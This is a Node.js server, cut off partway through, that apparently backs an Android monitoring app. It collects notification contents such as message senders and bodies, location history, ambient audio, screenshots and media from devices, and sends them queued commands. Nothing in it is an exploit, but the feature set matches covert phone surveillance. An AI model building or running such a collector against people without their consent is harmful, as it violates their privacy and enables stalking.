'use strict';
const express = require('express');
const sharp = require('sharp');
const exifr = require('exifr');
const multer = require('multer');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');
const { createICloudService } = require('./icloud_service');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const NEXUS_ROOT = process.env.NEXUS_ROOT || '/opt/data/nexus-local';
const DATA_DIR = process.env.NEXUS_DATA_DIR || path.join(NEXUS_ROOT, 'data');
const DASHBOARD_DIR = process.env.NEXUS_DASHBOARD_DIR || path.join(__dirname, 'dashboard');
const TOKEN = process.env.NEXUS_TOKEN || 'change-me';
const ONLINE_WINDOW_MS = 5 * 60 * 1000;
const MAX_RECORDS = 10000;

// ── Middleware ──────────────────────────────────────────────
app.use(cors({ origin: false }));
app.use((req, res, next) => {
  if (!req.path.includes("/dashboard") && !req.path.includes("/thumb")) {
    console.log(req.method + " " + req.path + " from " + (req.headers["x-forwarded-for"] || req.socket.remoteAddress));
  }
  next();
});
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/dashboard', express.static(DASHBOARD_DIR));

// ── Auth ────────────────────────────────────────────────────
function checkAuth(req, res, next) {
  const t = req.headers['x-token'] || req.query.token;
  const a = Buffer.from(String(t || ''));
  const b = Buffer.from(String(TOKEN || ''));
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

// ── Helpers ─────────────────────────────────────────────────
function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return def; }
}
function writeJSON(file, data) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  fs.renameSync(tmp, file);
}
function safeDeviceId(value) {
  const id = String(value || '');
  if (!/^[A-Za-z0-9._-]{1,128}$/.test(id)) throw new Error('invalid deviceId');
  return id;
}
function safeFilename(value) {
  const name = path.basename(String(value || '')).replace(/[^A-Za-z0-9._ -]/g, '_');
  if (!name || name === '.' || name === '..') throw new Error('invalid filename');
  return name.slice(0, 240);
}
function bounded(items, max = MAX_RECORDS) {
  return items.length > max ? items.slice(items.length - max) : items;
}
function deviceFile(sub, id, ext = 'json') {
  return path.join(DATA_DIR, sub, `${safeDeviceId(id)}.${ext}`);
}

// ── WebSocket broadcast ─────────────────────────────────────
const wsClients = new Set();
const deviceSockets = new Map(); // deviceId -> ws per push diretto comandi
wss.on('connection', (ws, req) => {
  const requestUrl = new URL(req.url, 'http://localhost');
  if (requestUrl.searchParams.get('token') !== TOKEN) return ws.close(1008, 'unauthorized');
  wsClients.add(ws);
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
  // close handled below
  ws.on('message', (msg) => {
    try {
      const d = JSON.parse(msg);
      // FIX 2 — deviceSockets mai popolata
      if (d.type === 'register' && d.deviceId) {
        ws.deviceId = d.deviceId;
        deviceSockets.set(d.deviceId, ws);
        ws.send(JSON.stringify({ type: 'registered', deviceId: d.deviceId }));
        return;
      }
      if (d.type === 'ping') ws.send(JSON.stringify({ type: 'pong' }));
    } catch {}
  });
  // FIX 1 — ws.on('close') mancante (memory leak)
  ws.on('close', () => {
    wsClients.delete(ws);
    if (ws.deviceId) deviceSockets.delete(ws.deviceId);
  });
  ws.send(JSON.stringify({ type: 'connected' }));
});
setInterval(() => {
  wsClients.forEach(ws => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 25000);
function broadcast(event, data) {
  const msg = JSON.stringify({ event, data, ts: Date.now() });
  wsClients.forEach(ws => { try { if (ws.readyState === 1) ws.send(msg); } catch {} });
}

// ── Upload media ────────────────────────────────────────────
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'media', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
});
const MAX_MEDIA_UPLOAD_BYTES = 1024 * 1024 * 1024;
const upload = multer({ storage, limits: { fileSize: MAX_MEDIA_UPLOAD_BYTES } });

const audioStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${safeFilename(file.originalname)}`)
});
const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 100 * 1024 * 1024 } });

const screenshotStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${safeFilename(file.originalname)}`)
});
const uploadScreenshot = multer({ storage: screenshotStorage, limits: { fileSize: 50 * 1024 * 1024 } });

const backupStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
});
const uploadBackup = multer({ storage: backupStorage, limits: { fileSize: 1024 * 1024 * 1024 } });


// ── Media metadata index / filters ───────────────────────────
const mediaIndexJobs = new Map();
const IMAGE_EXTS = new Set(['.jpg', '.jpeg', '.png', '.webp', '.heic', '.heif', '.gif', '.bmp', '.tif', '.tiff']);
const VIDEO_EXTS = new Set(['.mp4', '.mov', '.avi', '.mkv', '.3gp', '.webm', '.m4v']);
function mediaDirFor(deviceId) { return path.join(DATA_DIR, 'media', safeDeviceId(deviceId)); }
function mediaIndexFile(deviceId) { return path.join(mediaDirFor(deviceId), 'media-index.json'); }
function mediaMetaFile(deviceId) { return path.join(mediaDirFor(deviceId), 'meta.json'); }
function isMediaFilename(name) {
  const ext = path.extname(String(name || '')).toLowerCase();
  return IMAGE_EXTS.has(ext) || VIDEO_EXTS.has(ext);
}
function listMediaFiles(dir) {
  const out = [];
  function walk(base) {
    if (!fs.existsSync(base)) return;
    for (const ent of fs.readdirSync(base, { withFileTypes: true })) {
      if (ent.name === 'meta.json' || ent.name === 'media-index.json') continue;
      const full = path.join(base, ent.name);
      if (ent.isDirectory()) walk(full);
      else if (ent.isFile() && isMediaFilename(ent.name)) out.push(full);
    }
  }
  walk(dir);
  return out;
}
function inferMimeFromName(name) {
  const ext = path.extname(String(name || '')).toLowerCase();
  if (ext === '.jpg' || ext === '.jpeg') return 'image/jpeg';
  if (ext === '.png') return 'image/png';
  if (ext === '.webp') return 'image/webp';
  if (ext === '.heic' || ext === '.heif') return 'image/heic';
  if (ext === '.gif') return 'image/gif';
  if (VIDEO_EXTS.has(ext)) return ext === '.mov' ? 'video/quicktime' : 'video/' + ext.slice(1);
  return 'application/octet-stream';
}
function inferMediaSource(name, relPath) {
  const n = String(name || '').toLowerCase();
  const r = String(relPath || '').toLowerCase();
  if (r.includes('icloud')) return 'icloud';
  if (n.includes('screenshot') || n.startsWith('screen_')) return 'screenshot';
  if (n.includes('-wa') || n.includes('whatsapp') || n.includes('sticker') || /^img-\d{8}-wa/i.test(name) || /^vid-\d{8}-wa/i.test(name)) return 'whatsapp';
  if (n.startsWith('img_') || n.startsWith('dsc_') || n.startsWith('pxl_')) return 'camera';
  if (n.startsWith('vid_')) return 'camera_video';
  if (n.includes('download')) return 'download';
  return 'other';
}
function inferDateFromName(name) {
  const s = String(name || '');
  const patterns = [
    /(20\d{2})[-_]?([01]\d)[-_]?([0-3]\d)[-_ ]?([0-2]\d)?[-_]?([0-5]\d)?[-_]?([0-5]\d)?/,
    /IMG[-_](20\d{2})([01]\d)([0-3]\d)[-_]?WA/i,
    /VID[-_](20\d{2})([01]\d)([0-3]\d)[-_]?WA/i
  ];
  for (const re of patterns) {
    const m = s.match(re);
    if (!m) continue;
    const y = Number(m[1]), mo = Number(m[2]), d = Number(m[3]);
    const hh = Number(m[4] || 0), mm = Number(m[5] || 0), ss = Number(m[6] || 0);
    const dt = new Date(y, mo - 1, d, hh, mm, ss);
    if (!Number.isNaN(dt.getTime())) return dt.getTime();
  }
  return null;
}
function orientationFromDimensions(width, height) {
  if (!width || !height) return 'unknown';
  if (width > height * 1.08) return 'landscape';
  if (height > width * 1.08) return 'portrait';
  return 'square';
}
function cleanExifText(v) { return String(v || '').replace(/\s+/g, ' ').trim(); }
function cameraDeviceFromExif(exif) {
  if (!exif) return 'unknown';
  const make = cleanExifText(exif.make);
  const model = cleanExifText(exif.model);
  if (!make && !model) return 'unknown';
  if (make && model && model.toLowerCase().startsWith(make.toLowerCase())) return model;
  return [make, model].filter(Boolean).join(' ');
}
function mergeUploadMetaByName(meta) {
  const map = new Map();
  for (const m of Array.isArray(meta) ? meta : []) {
    const key = m.name || m.filename || m.originalName;
    if (key && !map.has(key)) map.set(key, m);
  }
  return map;
}
async function buildMediaIndex(deviceId, opts = {}) {
  const safeId = safeDeviceId(deviceId);
  const dir = mediaDirFor(safeId);
  const job = opts.job || { status: 'running', processed: 0, total: 0, startedAt: Date.now(), errors: [] };
  if (!fs.existsSync(dir)) {
    const empty = { generatedAt: Date.now(), deviceId: safeId, total: 0, items: [], facets: {} };
    writeJSON(mediaIndexFile(safeId), empty);
    return empty;
  }
  const uploadMeta = readJSON(mediaMetaFile(safeId), []);
  const uploadByName = mergeUploadMetaByName(uploadMeta);
  const files = listMediaFiles(dir);
  job.total = files.length;
  const items = [];
  for (const full of files) {
    const rel = path.relative(dir, full).replace(/\\/g, '/');
    const name = path.basename(full);
    const ext = path.extname(name).toLowerCase();
    const upload = uploadByName.get(name) || uploadByName.get(rel) || {};
    try {
      const st = fs.statSync(full);
      const isImage = IMAGE_EXTS.has(ext);
      const isVideo = VIDEO_EXTS.has(ext);
      let width = null, height = null, format = ext.replace('.', '') || null, orientation = 'unknown', hasAlpha = false, density = null, pages = null;
      let exif = null;
      if (isImage) {
        try {
          const md = await sharp(full, { failOn: 'none', pages: 1 }).metadata();
          width = md.width || null;
          height = md.height || null;
          format = md.format || format;
          orientation = orientationFromDimensions(width, height);
          hasAlpha = !!md.hasAlpha;
          density = md.density || null;
          pages = md.pages || null;
        } catch (e) {
          job.errors.push({ name, error: 'metadata: ' + e.message });
        }
        try {
          const rawExif = await exifr.parse(full, { pick: ['DateTimeOriginal', 'CreateDate', 'ModifyDate', 'Make', 'Model', 'LensModel', 'latitude', 'longitude', 'GPSLatitude', 'GPSLongitude'] });
          if (rawExif) {
            const exifDate = rawExif.DateTimeOriginal || rawExif.CreateDate || rawExif.ModifyDate || null;
            exif = {
              dateTimeOriginal: exifDate instanceof Date ? exifDate.getTime() : (exifDate ? new Date(exifDate).getTime() : null),
              make: rawExif.Make || null,
              model: rawExif.Model || null,
              lensModel: rawExif.LensModel || null,
              latitude: Number.isFinite(rawExif.latitude) ? rawExif.latitude : (Number.isFinite(rawExif.GPSLatitude) ? rawExif.GPSLatitude : null),
              longitude: Number.isFinite(rawExif.longitude) ? rawExif.longitude : (Number.isFinite(rawExif.GPSLongitude) ? rawExif.GPSLongitude : null)
            };
          }
        } catch {}
      }
      const parsedTs = inferDateFromName(name);
      const takenAt = upload.dateTaken || upload.takenAt || upload.mediaDate || exif?.dateTimeOriginal || parsedTs || upload.ts || upload.serverTime || st.mtimeMs;
      const item = {
        name,
        filename: name,
        relPath: rel,
        originalName: upload.originalName || name,
        size: st.size,
        mime: upload.mime || inferMimeFromName(name),
        kind: isVideo ? 'video' : 'photo',
        type: isVideo ? 'video' : 'photo',
        ext: ext.replace('.', ''),
        width,
        height,
        orientation: isVideo ? 'video' : orientation,
        format,
        hasAlpha,
        density,
        pages,
        source: inferMediaSource(name, rel),
        exif,
        cameraMake: cleanExifText(exif?.make),
        cameraModel: cleanExifText(exif?.model),
        cameraDevice: cameraDeviceFromExif(exif),
        hasGps: !!(exif && Number.isFinite(exif.latitude) && Number.isFinite(exif.longitude)),
        uploadedAt: upload.ts || upload.serverTime || null,
        fileMtime: st.mtimeMs,
        fileCtime: st.ctimeMs,
        takenAt,
        year: takenAt ? new Date(takenAt).getFullYear() : null,
        month: takenAt ? (new Date(takenAt).getMonth() + 1) : null,
        day: takenAt ? new Date(takenAt).getDate() : null,
        indexedAt: Date.now()
      };
      items.push(item);
    } catch (e) {
      job.errors.push({ name, error: e.message });
    }
    job.processed += 1;
    if (job.processed % 250 === 0) job.updatedAt = Date.now();
  }
  items.sort((a, b) => (b.takenAt || b.fileMtime || 0) - (a.takenAt || a.fileMtime || 0));
  const facets = computeMediaFacets(items);
  const index = { generatedAt: Date.now(), deviceId: safeId, total: items.length, items, facets, errors: job.errors.slice(0, 50) };
  writeJSON(mediaIndexFile(safeId), index);
  return index;
}
function computeMediaFacets(items) {
  const facet = { types: {}, sources: {}, cameraDevices: {}, years: {}, months: {}, orientations: {}, extensions: {} };
  for (const it of items) {
    const inc = (obj, k) => { if (k !== undefined && k !== null && k !== '') obj[String(k)] = (obj[String(k)] || 0) + 1; };
    inc(facet.types, it.kind || it.type);
    inc(facet.sources, it.source);
    inc(facet.cameraDevices, it.cameraDevice || cameraDeviceFromExif(it.exif));
    inc(facet.years, it.year);
    inc(facet.months, it.month);
    inc(facet.orientations, it.orientation);
    inc(facet.extensions, it.ext);
  }
  return facet;
}
function loadMediaIndexOrFallback(deviceId) {
  const safeId = safeDeviceId(deviceId);
  const indexPath = mediaIndexFile(safeId);
  const idx = readJSON(indexPath, null);
  if (idx && Array.isArray(idx.items)) return idx;
  const meta = readJSON(mediaMetaFile(safeId), []);
  const items = (Array.isArray(meta) ? meta : []).map(m => {
    const name = m.name || m.filename || m.originalName || '';
    const kind = (m.mime && m.mime.startsWith('video/')) || VIDEO_EXTS.has(path.extname(name).toLowerCase()) ? 'video' : 'photo';
    const takenAt = m.ts || m.serverTime || null;
    return { ...m, name, filename: name, kind, type: kind, source: inferMediaSource(name, ''), cameraDevice: m.cameraDevice || cameraDeviceFromExif(m.exif), takenAt, year: takenAt ? new Date(takenAt).getFullYear() : null, month: takenAt ? new Date(takenAt).getMonth() + 1 : null, orientation: kind === 'video' ? 'video' : 'unknown', ext: path.extname(name).slice(1).toLowerCase() };
  });
  return { generatedAt: null, deviceId: safeId, total: items.length, items, facets: computeMediaFacets(items), fallback: true };
}
function applyMediaFilters(items, query) {
  let out = Array.isArray(items) ? items.slice() : [];
  const q = String(query.q || query.search || '').trim().toLowerCase();
  if (query.type && query.type !== 'all') out = out.filter(m => (m.kind || m.type) === query.type);
  if (query.source && query.source !== 'all') out = out.filter(m => m.source === query.source);
  const cameraQuery = query.cameraDevice || query.camera || query.deviceCamera;
  if (cameraQuery && cameraQuery !== 'all') out = out.filter(m => (m.cameraDevice || cameraDeviceFromExif(m.exif)) === cameraQuery);
  if (query.year && query.year !== 'all') out = out.filter(m => String(m.year) === String(query.year));
  if (query.month && query.month !== 'all') out = out.filter(m => String(m.month) === String(query.month));
  if (query.orientation && query.orientation !== 'all') out = out.filter(m => m.orientation === query.orientation);
  if (query.ext && query.ext !== 'all') out = out.filter(m => m.ext === query.ext);
  if (query.minSize) out = out.filter(m => Number(m.size || 0) >= Number(query.minSize));
  if (query.maxSize) out = out.filter(m => Number(m.size || 0) <= Number(query.maxSize));
  if (q) out = out.filter(m => [m.name, m.originalName, m.relPath, m.source, m.cameraDevice, m.cameraMake, m.cameraModel, m.exif?.make, m.exif?.model, m.mime, m.ext].some(v => String(v || '').toLowerCase().includes(q)));
  const sort = String(query.sort || 'date_desc');
  const val = (m, key) => Number(m[key] || 0);
  out.sort((a, b) => {
    if (sort === 'date_asc') return val(a, 'takenAt') - val(b, 'takenAt');
    if (sort === 'size_desc') return val(b, 'size') - val(a, 'size');
    if (sort === 'size_asc') return val(a, 'size') - val(b, 'size');
    if (sort === 'name_asc') return String(a.name || '').localeCompare(String(b.name || ''));
    return val(b, 'takenAt') - val(a, 'takenAt');
  });
  return out;
}

// ═══════════════════════════════════════════════════════════
// API ROUTES
// ═══════════════════════════════════════════════════════════

// ── Ping / heartbeat ────────────────────────────────────────
// Token is never exposed by an endpoint; dashboard receives it out-of-band.
app.get('/api/token', (req, res) => res.status(404).json({ error: 'not found' }));
app.post('/api/ping', checkAuth, (req, res) => {
  const { deviceId, deviceName, model, androidVersion, battery, network, ip, reliabilityProtocol, status } = req.body;
  if (!deviceId) return res.json({ ok: false });
  const devFile = path.join(DATA_DIR, 'devices.json');
  const devices = readJSON(devFile, {});
  devices[deviceId] = {
    ...devices[deviceId],
    deviceId, deviceName, model, androidVersion,
    battery, network, ip, reliabilityProtocol: reliabilityProtocol || 1,
    status: status && typeof status === 'object' ? status : devices[deviceId]?.status,
    lastSeen: Date.now(),
    online: true
  };
  writeJSON(devFile, devices);
  broadcast('device_ping', { deviceId, battery, network, lastSeen: Date.now() });

  // Rispondi con comandi pending
  const cmdFile = deviceFile('commands', deviceId);
  const cmds = readJSON(cmdFile, []);
  // Protocol v2 keeps commands until explicit app ACK. Legacy clients retain
  // consume-on-delivery semantics to avoid repeated execution.
  if (cmds.length > 0 && Number(reliabilityProtocol || 1) < 2) writeJSON(cmdFile, []);
  res.json({ ok: true, commands: cmds });
});

// ── Devices ─────────────────────────────────────────────────
app.get('/api/devices', checkAuth, (req, res) => {
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const now = Date.now();
  Object.values(devices).forEach(d => {
    // FIX 4 — soglia online 60s → 300s (5 minuti)
    d.online = (now - (d.lastSeen || 0)) < ONLINE_WINDOW_MS;
  });
  res.json(Object.values(devices));
});

// ── Events / notifiche ──────────────────────────────────────
app.post('/api/events', checkAuth, (req, res) => {
  const { deviceId, events } = req.body;
  if (!deviceId || !Array.isArray(events)) return res.json({ ok: false });
  const file = deviceFile('events', deviceId);
  const existing = readJSON(file, []);
  const sanitize = s => typeof s === 'string' ? s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, ' ') : s;
  const incoming = events.map(e => ({
    ...e,
    title: sanitize(e.title),
    conversation: sanitize(e.conversation),
    sender: sanitize(e.sender),
    body: sanitize(e.body),
    ts: e.ts || Date.now()
  }));
  const known = new Set(existing.map(e => e.eventId).filter(Boolean));
  const newEvents = incoming.filter(e => !e.eventId || !known.has(e.eventId));
  const merged = [...existing, ...newEvents];
  writeJSON(file, bounded(merged));
  newEvents.forEach(e => broadcast('event', { deviceId, ...e }));
  res.json({ ok: true });
});

app.get('/api/events', checkAuth, (req, res) => {
  const { deviceId, app: appFilter, limit = 200 } = req.query;
  if (!deviceId) {
    // Tutti i device
    const dir = path.join(DATA_DIR, 'events');
    let all = [];
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach(f => {
        const did = f.replace('.json', '');
        const evs = readJSON(path.join(dir, f), []);
        evs.forEach(e => all.push({ ...e, deviceId: did }));
      });
    }
    // FIX 5 — timestamp eventi: ts vs timestamp
    all.sort((a, b) => (b.ts || b.timestamp || 0) - (a.ts || a.timestamp || 0));
    return res.json(all.slice(0, parseInt(limit)));
  }
  const file = deviceFile('events', deviceId);
  let evs = readJSON(file, []);
  if (appFilter) evs = evs.filter(e => e.app === appFilter);
  // FIX 5 — timestamp eventi: ts vs timestamp
  evs.sort((a, b) => (b.ts || b.timestamp || 0) - (a.ts || a.timestamp || 0));
  res.json(evs.slice(0, parseInt(limit)));
});

// ── Location ─────────────────────────────────────────────────
app.post('/api/location', checkAuth, (req, res) => {
  const { deviceId, lat, lng, accuracy, altitude, speed, ts } = req.body;
  if (!deviceId || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
    return res.status(400).json({ ok: false });
  }
  const file = deviceFile('locations', deviceId);
  const locs = readJSON(file, []);
  const entry = { lat, lng, accuracy, altitude, speed, ts: ts || Date.now() };
  locs.push(entry);
  writeJSON(file, bounded(locs));
  broadcast('location', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/location/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('locations', req.params.deviceId);
  const locs = readJSON(file, []);
  res.json(locs);
});
app.get('/api/locations/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('locations', req.params.deviceId), []));
});

// ── Comandi ──────────────────────────────────────────────────
app.get('/api/commands/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  // Read-only inspection; delivery happens in heartbeat and removal only via ACK.
  res.json(cmds);
});

app.post('/api/commands/:deviceId/:commandId/ack', checkAuth, (req, res) => {
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  const found = cmds.find(c => c.id === req.params.commandId);
  if (!found) return res.json({ ok: true, alreadyAcked: true });
  writeJSON(file, cmds.filter(c => c.id !== req.params.commandId));
  const ackFile = deviceFile('command-acks', req.params.deviceId);
  const acks = readJSON(ackFile, []);
  acks.push({ ...found, success: req.body.success === true,
    detail: req.body.detail || '', ackedAt: Date.now() });
  writeJSON(ackFile, acks.slice(-1000));
  res.json({ ok: true });
});

app.post('/api/commands/:deviceId', checkAuth, (req, res) => {
  const { type, params } = req.body;
  const allowed = new Set(['sync_media', 'get_location', 'get_apps', 'get_status']);
  if (!type || !allowed.has(type)) {
    return res.status(400).json({ ok: false, error: 'unsupported command' });
  }
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  const cmd = { id: uuidv4(), type, params: params || {}, ts: Date.now() };
  cmds.push(cmd);
  writeJSON(file, cmds);
  broadcast('command_sent', { deviceId: req.params.deviceId, ...cmd });
  // Push diretto al device se connesso via WebSocket
  const devWs = deviceSockets.get(req.params.deviceId);
  if (devWs && devWs.readyState === 1) {
    devWs.send(JSON.stringify({ type: 'command', command: cmd }));
    console.log('WS push comando a ' + req.params.deviceId + ': ' + type);
  }
  res.json({ ok: true, command: cmd });
});

// ── Media (foto/video) ───────────────────────────────────────
app.post('/api/media/:deviceId', checkAuth, upload.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false, error: 'no file' });
  const { originalname, filename, size, mimetype } = req.file;
  const safeOriginalName = safeFilename(originalname);

  // Dedup check before committing the temp upload to the public media name.
  const metaFile = path.join(DATA_DIR, 'media', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  const exists = meta.find(m => (m.originalName || m.name) === safeOriginalName && m.size === size);
  if (exists) {
    try { fs.unlinkSync(req.file.path); } catch {}
    return res.json({ ok: true, dedup: true, filename: exists.name });
  }

  const mediaDir = path.join(DATA_DIR, 'media', deviceId);
  let finalName = safeOriginalName;
  let finalPath = path.join(mediaDir, finalName);
  if (fs.existsSync(finalPath)) {
    finalName = `${Date.now()}_${safeOriginalName}`;
    finalPath = path.join(mediaDir, finalName);
  }
  fs.renameSync(req.file.path, finalPath);

  const entry = { name: finalName, originalName: safeOriginalName, size, mime: mimetype, ts: Date.now() };
  meta.push(entry);
  writeJSON(metaFile, meta);
  broadcast('media_new', { deviceId, ...entry });
  res.json({ ok: true, filename: finalName });
});

app.get('/api/media/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const { page = 1, limit = 9999 } = req.query;
  const idx = loadMediaIndexOrFallback(deviceId);
  const filtered = applyMediaFilters(idx.items, req.query);
  const total = filtered.length;
  const lim = Math.max(1, Math.min(500, parseInt(limit) || 50));
  const start = (Math.max(1, parseInt(page) || 1) - 1) * lim;
  const items = filtered.slice(start, start + lim);
  res.json({ total, items, hasMore: start + items.length < total, facets: idx.facets, indexedAt: idx.generatedAt, indexFallback: !!idx.fallback });
});

app.get('/api/media/:deviceId/filters', checkAuth, (req, res) => {
  const idx = loadMediaIndexOrFallback(req.params.deviceId);
  res.json({ generatedAt: idx.generatedAt, total: idx.total || idx.items.length, facets: idx.facets || computeMediaFacets(idx.items), fallback: !!idx.fallback });
});

app.get('/api/media/:deviceId/index/status', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const job = mediaIndexJobs.get(deviceId);
  const idx = readJSON(mediaIndexFile(deviceId), null);
  res.json({ job: job || null, indexedAt: idx?.generatedAt || null, total: idx?.total || 0, errors: idx?.errors || [] });
});

app.post('/api/media/:deviceId/index/rebuild', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const existing = mediaIndexJobs.get(deviceId);
  if (existing && existing.status === 'running') return res.json({ ok: true, job: existing });
  const job = { id: uuidv4(), deviceId, status: 'running', processed: 0, total: 0, startedAt: Date.now(), updatedAt: Date.now(), errors: [] };
  mediaIndexJobs.set(deviceId, job);
  setImmediate(async () => {
    try {
      const idx = await buildMediaIndex(deviceId, { job });
      job.status = 'done';
      job.processed = idx.total;
      job.total = idx.total;
      job.finishedAt = Date.now();
      job.generatedAt = idx.generatedAt;
      job.errorCount = idx.errors?.length || 0;
    } catch (e) {
      job.status = 'error';
      job.error = e.message;
      job.finishedAt = Date.now();
    }
  });
  res.json({ ok: true, job });
});

app.get('/api/media/:deviceId/:filename', checkAuth, (req, res) => {
  const base = path.join(DATA_DIR, 'media', safeDeviceId(req.params.deviceId));
  const safeName = safeFilename(req.params.filename);
  let file = path.join(base, safeName);
  if (!fs.existsSync(file)) file = path.join(base, 'photos', safeName);
  if (!fs.existsSync(file)) file = path.join(base, 'videos', safeName);
  if (!fs.existsSync(file)) {
    const idx = loadMediaIndexOrFallback(req.params.deviceId);
    const found = idx.items.find(m => m.name === safeName || m.filename === safeName);
    if (found && found.relPath) {
      const candidate = path.resolve(base, found.relPath);
      if (candidate.startsWith(path.resolve(base) + path.sep) && fs.existsSync(candidate)) file = candidate;
    }
  }
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});


// ── Thumbnail cache ───────────────────────────────────────────
app.get('/api/thumb/:deviceId/:filename', checkAuth, async (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const filename = safeFilename(req.params.filename);
  const base = path.join(DATA_DIR, 'media', deviceId);
  let orig = path.join(base, filename);
  if (!fs.existsSync(orig)) orig = path.join(base, 'photos', filename);
  if (!fs.existsSync(orig)) orig = path.join(base, 'videos', filename);
  if (!fs.existsSync(orig)) return res.status(404).json({ error: 'not found' });

  const thumbDir = path.join(DATA_DIR, 'thumbs', deviceId);
  const thumbPath = path.join(thumbDir, filename + '.thumb.jpg');

  // Serve dalla cache se esiste
  if (fs.existsSync(thumbPath)) {
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    return res.sendFile(thumbPath);
  }

  // FIX 7 — thumb video non crasha
  if (/\.(mp4|mov|avi|mkv|3gp)$/i.test(filename)) {
    return res.status(415).json({ error: 'video thumbnail not supported' });
  }

  try {
    fs.mkdirSync(thumbDir, { recursive: true });
    await sharp(orig)
      .resize(300, 300, { fit: 'cover', position: 'centre' })
      .jpeg({ quality: 70, progressive: true })
      .toFile(thumbPath);
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.sendFile(thumbPath);
  } catch (e) {
    // Fallback: servi originale
    res.sendFile(orig);
  }
});

// ── Audio ambientale ─────────────────────────────────────────
app.post('/api/audio/:deviceId', checkAuth, uploadAudio.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false });
  const entry = { name: req.file.filename, size: req.file.size, ts: Date.now() };
  const metaFile = path.join(DATA_DIR, 'audio', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  meta.unshift(entry);
  writeJSON(metaFile, meta);
  broadcast('audio_new', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/audio/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/audio/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── Screenshot ───────────────────────────────────────────────
app.post('/api/screenshot/:deviceId', checkAuth, uploadScreenshot.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false });
  const entry = { name: req.file.filename, size: req.file.size, ts: Date.now() };
  const metaFile = path.join(DATA_DIR, 'screenshots', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  meta.unshift(entry);
  writeJSON(metaFile, meta);
  broadcast('screenshot_new', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/screenshot/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/screenshot/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── Backup/cartella extra: separato dalla galleria MediaStore ───────────────
app.post('/api/backups/:deviceId', checkAuth, uploadBackup.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
